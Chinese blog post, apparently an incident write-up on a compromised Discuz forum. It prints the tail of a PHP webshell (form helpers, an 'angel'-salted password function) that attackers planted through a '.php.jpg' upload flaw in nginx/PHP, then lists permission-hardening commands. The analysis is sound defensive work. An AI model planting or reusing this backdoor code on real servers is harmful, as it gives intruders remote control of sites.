<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'size'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'size'</span>] &gt; <span style="color: #ffffff; background-color: #002451;">0</span> ? <span style="color: #99ffff;">"size=\"$arg[size]\""</span> : <span style="color: #99ffff;">"size=\"100\""</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'extra'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'extra'</span>] ? $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'extra'</span>] : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'type'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'type'</span>] = <span style="color: #99ffff;">'text'</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] ? $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>].<span style="color: #99ffff;">'&lt;br /&gt;'</span> : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'class'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'class'</span>] ? $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'class'</span>] : <span style="color: #99ffff;">'input'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'newline'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #99ffff; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #99ffff; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">makeselect</span>($<span style="color: #ffeead;">arg</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'onchange'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">onchange</span> = <span style="color: #99ffff;">'onchange="'</span>.$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'onchange'</span>].<span style="color: #99ffff;">'"'</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] ? $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'newline'</span>]) <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #99ffff; text-decoration: underline;"> $onchange&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_array(</span>$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'option'</span>])) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'nokey'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'option'</span>] <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">value</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'selected'</span>]==$<span style="color: #ffeead;">value</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'option'</span>] <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span>=&gt;$<span style="color: #ffeead;">value</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'selected'</span>]==$<span style="color: #ffeead;">key</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;/select&gt;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'newline'</span>]) <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">formhead</span>($<span style="color: #ffeead;">arg</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">self</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'method'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'method'</span>] = <span style="color: #99ffff;">'post'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'action'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'action'</span>] = $<span style="color: #ffeead;">self</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'target'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'target'</span>] ? <span style="color: #99ffff;">"target=\"$arg[target]\""</span> : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'name'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'name'</span>] = <span style="color: #99ffff;">'form1'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #99ffff; text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;'</span>.$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>].<span style="color: #99ffff;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">maketext</span>($<span style="color: #ffeead;">arg</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>)){
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'cols'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'cols'</span>] = <span style="color: #ffffff; background-color: #002451;">100</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'rows'</span>] &amp;&amp; $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'rows'</span>] = <span style="color: #ffffff; background-color: #002451;">25</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] = $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>] ? $<span style="color: #ffeead;">arg</span>[<span style="color: #99ffff;">'title'</span>].<span style="color: #99ffff;">'&lt;br /&gt;'</span> : <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #99ffff; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">formfooter</span>($<span style="color: #ffeead;">name</span> = <span style="color: #99ffff;">''</span>){
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">name</span> &amp;&amp; $<span style="color: #ffeead;">name</span> = <span style="color: #99ffff;">'submit'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #ffeead;">name</span>.<span style="color: #99ffff;">'" id="'</span>.$<span style="color: #ffeead;">name</span>.<span style="color: #99ffff;">'" type="submit" value=</span><span style="color: #99ffff; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/form&gt;'</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">goback</span>(){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">self</span>, $<span style="color: #ffeead;">nowpath</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #99ffff; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">formfoot</span>(){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/form&gt;'</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">encode_pass</span>($<span style="color: #ffeead;">pass</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pass</span> = <span style="color: #ffffff; background-color: #002451;">md5(</span><span style="color: #99ffff;">'angel'</span>.$<span style="color: #ffeead;">pass</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pass</span> = <span style="color: #ffffff; background-color: #002451;">md5(</span>$<span style="color: #ffeead;">pass</span>.<span style="color: #99ffff;">'angel'</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">pass</span> = <span style="color: #ffffff; background-color: #002451;">md5(</span><span style="color: #99ffff;">'angel'</span>.$<span style="color: #ffeead;">pass</span>.<span style="color: #99ffff;">'angel'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">pass</span>;
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">pr</span>($<span style="color: #ffeead;">s</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">"&lt;pre&gt;"</span>.<span style="color: #ffffff; background-color: #002451;">print_r(</span>$<span style="color: #ffeead;">s</span>).<span style="color: #99ffff;">'&lt;/pre&gt;'</span>;
}

<span style="color: #ebbbff;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #99ffff;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #99ffff;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #99ffff;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc<sub>server</sub>/data/avatar
</li>
<li>uc<sub>server</sub>/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>

        </div>
        <br />
        <footer class="article-footer">
          <a class="tag" href="/tag/discuz/0.html"><i class="icon-tag icon-white"></i> discuz</a>
          <a class="tag" href="/tag/security/0.html"><i class="icon-tag icon-white"></i> security</a>
          <a class="tag" href="/tag/web/0.html"><i class="icon-tag icon-white"></i> web</a>
          <span class="muted">
            <i class="icon-time icon-white"></i> <time datetime="2014-04-01T21:38:00+0800">2014年4月1日9时</time>
          </span>
        </footer>
      </div>

<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'kankananblog';

  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      <div class="push-footer"></div>
    </div>

    <div id="footer">
  	  <div class="copyright" style="text-align: center;">
  	    版权所有 © 2011-2015 看看俺 – KanKanAn.com
  	    <p>Powered by <a href="https://github.com/tangxinfa/ediary">ediary</a>.</p>
  	  </div>
    </div>
  </body>
</html>
